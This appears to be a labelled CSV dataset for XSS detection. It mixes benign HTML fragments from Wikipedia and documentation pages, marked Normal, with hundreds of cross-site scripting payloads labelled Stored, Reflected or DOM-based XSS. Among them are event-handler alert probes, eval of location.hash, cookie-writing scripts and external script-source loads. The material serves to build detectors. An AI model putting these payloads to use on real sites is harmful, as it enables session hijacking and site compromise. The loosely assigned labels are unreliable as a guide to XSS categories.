Sentence,Final_Label
"	 </span> <span class=""reference-text""><a href=""#CITEREFKismet""><i>Kismet </i> </a>. ",Normal
</div>,Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",Reflected XSS
"<object oncopy=""alert(1)"" contenteditable>test</object>",Stored XSS
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",Reflected XSS
"<svg onmouseover=""alert(1)"">test</svg>",Stored XSS
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",Reflected XSS
"<track onmouseout=""alert(1)"">test</track>",Reflected XSS
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;489, who calls it ""a determinedly scruffy enterprise"" </li>",Normal
"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",Stored XSS
"<output onbeforecopy=""alert(1)"" contenteditable>test</output>",Reflected XSS
<head onpointermove=alert(1)>XSS</head>,Reflected XSS
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",Reflected XSS
"<menu onmouseleave=""alert(1)"">test</menu>",Reflected XSS
"<dt><a class=""reference internal"" href=""topics/exceptions.html""><span class=""doc"">Exceptions",Normal
"<li id=""cite_note-415""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-415"">^ </a> </b> ",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
0x42.0x0000066.0x7.0x93/,Stored XSS
"<p>Artificial intelligence (AI) is becoming a mainstay component of law-related professions. In some circumstances, this analytics-crunching technology is using algorithms and machine learning to do work that was previously done by entry-level lawyers.<sup class=""noprint Inline-Template Template-Fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citation_needed"" title=""Wikipedia:Citation needed""><span title=""This claim needs references to reliable sources. (December 2019)"">citation needed ",Normal
"	 </span> <span class=""reference-text"">Griewank, Andreas (2012). Who Invented the Reverse Mode of Differentiation?. Optimization Stories, Documenta Matematica, Extra Volume ISMP (2012), 389–400. ",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
	 </span> </li>,Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<noembed onmouseenter=""alert(1)"">test</noembed>",Reflected XSS
 </li>,Normal
"<dt><a class=""reference internal"" href=""topics/link-extractors.html""><span class=""doc"">Link Extractors",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
	 </span></a></dt><dd>Read webpage data that is loaded dynamically.</dd>,Normal
          </dd>,Normal
"<rtc onmouseenter=""alert(1)"">test</rtc>",Reflected XSS
"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<map onmouseout=""alert(1)"">test</map>",Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/contracts.html"">Spiders Contracts</a></li>",Normal
 </li>,Normal
"<li><a href=""/wiki/Glossary_of_ecology"" title=""Glossary of ecology"">Ecology </a> </li>",Normal
<section onpointermove=alert(1)>XSS</section>,Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<li><a href=""/wiki/Dependability"" title=""Dependability"">Dependability </a> </li> </ul>",Normal
<embed onpointerup=alert(1)>XSS</embed>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",Reflected XSS
<rb id=x tabindex=1 onfocus=alert(1)></rb>,Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
AI in myth:,Normal
"<map draggable=""true"" ondragend=""alert(1)"">test</map>",Reflected XSS
<svg><element onload=alert(1)></element>,Stored XSS
 </ol> </div> </div>,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<ul onpointerout=alert(1)>XSS</ul>,Reflected XSS
"<menuitem onmouseout=""alert(1)"">test</menuitem>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio; Bhatt, Mehul; Oltramari, Alessandro; Vernon, David (May 2018). ""The role of cognitive architectures in general artificial intelligence"". <i>Cognitive Systems Research </i>. <b>48 </b>: 1–3. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.08.003"">10.1016/j.cogsys.2017.08.003 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665249"">2318/1665249 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+role+of+cognitive+architectures+in+general+artificial+intelligence&amp;rft.volume=48&amp;rft.pages=1-3&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665249&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.08.003&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rft.au=Bhatt%2C+Mehul&amp;rft.au=Oltramari%2C+Alessandro&amp;rft.au=Vernon%2C+David&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>,Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></svg>",Stored XSS
<svg><data onload=alert(1)></data>,Stored XSS
"<body onresize=""alert(1)"">",Reflected XSS
<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>,Stored XSS
<script onpointermove=alert(1)>XSS</script>,Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<strong onmouseleave=""alert(1)"">test</strong>",Reflected XSS
&#x00003C,Stored XSS
<blockquote onpointerup=alert(1)>XSS</blockquote>,Reflected XSS
<svg><p onload=alert(1)></p>,Stored XSS
"<p>If an AI system replicates all key aspects of human intelligence, will that system also be <a href=""/wiki/Sentience"" title=""Sentience"">sentient </a>—will it have a <a href=""/wiki/Mind"" title=""Mind"">mind </a> which has <a href=""/wiki/Consciousness"" title=""Consciousness"">conscious experiences </a>? This question is closely related to the philosophical problem as to the nature of human consciousness, generally referred to as the <a href=""/wiki/Hard_problem_of_consciousness"" title=""Hard problem of consciousness"">hard problem of consciousness </a>.",Normal
"<li onkeydown=""alert(1)"" contenteditable>test</li>",Reflected XSS
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",Reflected XSS
"	 <div style=""padding:0em 0.25em"">",Normal
"<li id=""cite_note-Non-deterministic_planning-113""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Non-deterministic_planning_113-0"">^ </a> </b> ",Normal
</footer>,Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=IEEE+Spectrum%3A+Technology%2C+Engineering%2C+and+Science+News&amp;rft.atitle=Full+Page+Reload&amp;rft_id=https%3A%2F%2Fspectrum.ieee.org%2Fbiomedical%2Fdiagnostics%2Fhow-ibm-watson-overpromised-and-underdelivered-on-ai-health-care&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
    </nav>,Normal
<svg><pre onload=alert(1)></pre>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"echo('IPT>alert("""")</SCRIPT>')",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<button oncut=""alert(1)"" contenteditable>test</button>",Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<svg><var onload=alert(1)></var>,Stored XSS
"<noscript draggable=""true"" ondragstart=""alert(1)"">test</noscript>",Reflected XSS
"<li><cite class=""citation book""><a href=""/wiki/Richard_Neapolitan"" title=""Richard Neapolitan"">Neapolitan, Richard </a>; Jiang, Xia (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.crcpress.com/Contemporary-Artificial-Intelligence-Second-Edition/Neapolitan-Jiang/p/book/9781138502383""><i>Artificial Intelligence: With an Introduction to Machine Learning </i> </a>. Chapman &amp; Hall/CRC. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-138-50238-3"" title=""Special:BookSources/978-1-138-50238-3""><bdi>978-1-138-50238-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+With+an+Introduction+to+Machine+Learning&amp;rft.pub=Chapman+%26+Hall%2FCRC&amp;rft.date=2018&amp;rft.isbn=978-1-138-50238-3&amp;rft.aulast=Neapolitan&amp;rft.aufirst=Richard&amp;rft.au=Jiang%2C+Xia&amp;rft_id=https%3A%2F%2Fwww.crcpress.com%2FContemporary-Artificial-Intelligence-Second-Edition%2FNeapolitan-Jiang%2Fp%2Fbook%2F9781138502383&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",Reflected XSS
"<optgroup onmouseleave=""alert(1)"">test</optgroup>",Reflected XSS
<ul onpointerleave=alert(1)>XSS</ul>,Reflected XSS
<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>,Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<svg><menuitem onload=alert(1)></menuitem>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<svg draggable=""true"" ondragend=""alert(1)"">test</svg>",Stored XSS
<svg><marquee onload=alert(1)></marquee>,Stored XSS
<svg><base onload=alert(1)></base>,Stored XSS
"<b onmouseover=""alert(1)"">test</b>",Reflected XSS
<svg><div onload=alert(1)></div>,Stored XSS
<iframe id=x onfocus=alert(1)>,Stored XSS
"<object oncontextmenu=""alert(1)"">test</object>",Stored XSS
	 </span> 2018 ,Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<li><i><a href=""/wiki/Index_of_philosophy_of_mind_articles"" title=""Index of philosophy of mind articles"">more... </a> </i> </li> </ul>",Normal
<svg><acronym onload=alert(1)></acronym>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
"<address onmouseover=""alert(1)"">test</address>",Reflected XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<hr onpointerenter=alert(1)>XSS</hr>,Reflected XSS
"<li><a href=""/wiki/Evolutionary_programming"" title=""Evolutionary programming"">Evolutionary programming </a> </li>",Normal
 </li>,Normal
	 </span> 2007 ,Normal
"<embed onmouseenter=""alert(1)"">test</embed>",Stored XSS
<slot onpointerover=alert(1)>XSS</slot>,Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<script onpointerleave=alert(1)>XSS</script>,Stored XSS
<img onpointerout=alert(1)>XSS</img>,Reflected XSS
"<object onkeyup=""alert(1)"" contenteditable>test</object>",Stored XSS
<mark onpointerup=alert(1)>XSS</mark>,Reflected XSS
 </li>,Normal
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationend=""alert(1)""></command>",Reflected XSS
"	 <div style=""padding:0em 0.25em"">",Normal
	 </span>,Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<image oncopy=""alert(1)"" contenteditable>test</image>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<p id=x tabindex=1 onbeforeactivate=alert(1)></p>,Reflected XSS
"<time ondblclick=""alert(1)"">test</time>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<div id=""mw-head-base"" class=""noprint""> </div>",Normal
"	 </span> <span class=""reference-text"">",Normal
"<th draggable=""true"" ondragend=""alert(1)"">test</th>",Reflected XSS
</div>,Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
 ,Normal
"<li><a href=""/wiki/Consciousness"" title=""Consciousness"">Consciousness </a> </li>",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<div id=""p-variants"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-variants-label"">",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
 </li>,Normal
"<object draggable=""true"" ondragleave=""alert(1)"">test</object>",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<SCRIPT SRC=""http://.rocks/.jpg""></SCRIPT>",Stored XSS
"<li><cite id=""CITEREFClark2015"" class=""citation web"">Clark, Jack (8 December 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">""Why 2015 Was a Breakthrough Year in Artificial Intelligence"" </a>. <i>Bloomberg News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161123053855/https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">Archived </a> from the original on 23 November 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 November ",Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,Reflected XSS
"<li><a href=""/wiki/Frame_problem"" title=""Frame problem"">Frame problem </a> </li>",Normal
<dialog onpointerdown=alert(1)>XSS</dialog>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",Stored XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",Stored XSS
"<script onmouseout=""alert(1)"">test</script>",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<figcaption onpointerover=alert(1)>XSS</figcaption>,Reflected XSS
<svg><animate onend=alert(1) attributeName=x dur=1s>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<i onmouseover=""alert(1)"">test</i>",Reflected XSS
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,Stored XSS
"<meta onkeypress=""alert(1)"" contenteditable>test</meta>",Reflected XSS
"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",Stored XSS
<s onpointermove=alert(1)>XSS</s>,Reflected XSS
<input4 onpointerup=alert(1)>XSS</input4>,Reflected XSS
<custom tags onpointerleave=alert(1)>XSS</custom tags>,Reflected XSS
<svg><meta onload=alert(1)></meta>,Stored XSS
"	 </span> <span class=""reference-text"">",Normal
"<embed onmousemove=""alert(1)"">test</embed>",Stored XSS
"<listing oncontextmenu=""alert(1)"">test</listing>",Reflected XSS
"<footer onkeydown=""alert(1)"" contenteditable>test</footer>",Reflected XSS
"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>",Stored XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=latimes.com&amp;rft.atitle=AlphaGo+beats+human+Go+champ+in+milestone+for+artificial+intelligence&amp;rft.date=2016&amp;rft.aulast=Borowiec&amp;rft.aufirst=Tracey+Lien%2C+Steven&amp;rft_id=https%3A%2F%2Fwww.latimes.com%2Fworld%2Fasia%2Fla-fg-korea-alphago-20160312-story.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,Reflected XSS
"<ol><li>If someone has a ""threat"" (that is, two in a row), take the remaining square. Otherwise, </li>",Normal
	 </span>(2009) </li>,Normal
<caption onpointerenter=alert(1)>XSS</caption>,Reflected XSS
"</TITLE><SCRIPT>alert("""");</SCRIPT>",Stored XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",Reflected XSS
	 </span> ,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<script onmousedown=""alert(1)"">test</script>",Stored XSS
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",Reflected XSS
 </li>,Normal
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,Stored XSS
"    <input type=""hidden"" name=""area"" value=""default"" />",Normal
"<hr onmouseover=""alert(1)"">test</hr>",Reflected XSS
 </li>,Normal
"<embed oncut=""alert(1)"" contenteditable>test</embed>",Stored XSS
javascript:alert(''),Reflected XSS
"<kbd onmouseenter=""alert(1)"">test</kbd>",Reflected XSS
"			<ul><li id=""coll-create_a_book""><a href=""/w/index.php?title=Special:Book&amp;bookcmd=book_creator&amp;referer=Artificial+intelligence"">Create a book </a> </li><li id=""coll-download-as-rl""><a href=""/w/index.php?title=Special:ElectronPdf&amp;page=Artificial+intelligence&amp;action=show-download-screen"">Download as PDF </a> </li><li id=""t-print""><a href=""/w/index.php?title=Artificial_intelligence&amp;printable=yes"" title=""Printable version of this page [p]"" accesskey=""p"">Printable version </a> </li> </ul>",Normal
"<svg onmousemove=""alert(1)"">test</svg>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
	 </span> 2017 ,Normal
"<Input value = """" type = text>",Stored XSS
<object data=/ onload=alert(1)>,Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",Reflected XSS
<svg><head onload=alert(1)></head>,Stored XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Other </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
 </ul>,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<body onmouseleave=""alert(1)"">test</body>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",Reflected XSS
"	 </span> </a> </i>&#93; </sup>. <a href=""/wiki/Google_AdSense"" title=""Google AdSense"">AdSense </a> uses a Bayesian network with over 300 million edges to learn which ads to serve.<sup id=""cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015chapter_6-212"">&#91;206&#93; </a> </sup>",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<frame ondblclick=""alert(1)"">test</frame>",Reflected XSS
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,Stored XSS
"<article onmousemove=""alert(1)"">test</article>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<li><a href=""/wiki/Resistive_random-access_memory"" title=""Resistive random-access memory"">RRAM </a> </li>",Normal
"<script>  setTimeout(\\""writetitle()\\"",$\_GET\[\]) </script>",Stored XSS
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",Stored XSS
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",Reflected XSS
"	 </span> <span class=""reference-text""><a href=""#CITEREFHinton2007"">Hinton 2007 </a>. ",Normal
<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>,Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<nav onmouseenter=""alert(1)"">test</nav>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<a href=""/wiki/Robotic"" class=""mw-redirect"" title=""Robotic"">Robotics </a>:",Normal
<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>,Stored XSS
	 </span> 2018 ,Normal
"<li><a href=""/wiki/Mind%E2%80%93body_dualism"" title=""Mind–body dualism"">Mind–body dualism </a> </li>",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<big onmouseleave=""alert(1)"">test</big>",Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",Reflected XSS
"<A HREF=""http://0x42.0x0000066.0x7.0x93/""></A>",Stored XSS
"<canvas onmouseenter=""alert(1)"">test</canvas>",Reflected XSS
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,Stored XSS
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",Reflected XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",Reflected XSS
<select onpointerup=alert(1)>XSS</select>,Reflected XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<svg onmousedown=""alert(1)"">test</svg>",Stored XSS
"<samp draggable=""true"" ondragend=""alert(1)"">test</samp>",Reflected XSS
<svg><table onload=alert(1)></table>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<title id=x tabindex=1 onactivate=alert(1)></title>,Reflected XSS
"<object oncopy=""alert(1)"" contenteditable>test</object>",Stored XSS
"<li id=""cite_note-47""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-47"">^ </a> </b> ",Normal
"READTHEDOCS_DATA['page'] = ""index""",Normal
<svg><ol onload=alert(1)></ol>,Stored XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Cyberneticist"" title=""Cyberneticist"">Cyberneticians </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<frame onbeforepaste=""alert(1)"" contenteditable>test</frame>",Reflected XSS
		 </div> </div>,Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<blink onmouseenter=""alert(1)"">test</blink>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",Reflected XSS
"<figcaption onmousemove=""alert(1)"">test</figcaption>",Reflected XSS
	 </span> 2018 ,Normal
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,Reflected XSS
<script onpointermove=alert(1)>XSS</script>,Stored XSS
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></embed>",Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<dt><a class=""reference internal"" href=""topics/item-pipeline.html""><span class=""doc"">Item Pipeline",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<sub id=x tabindex=1 onactivate=alert(1)></sub>,Reflected XSS
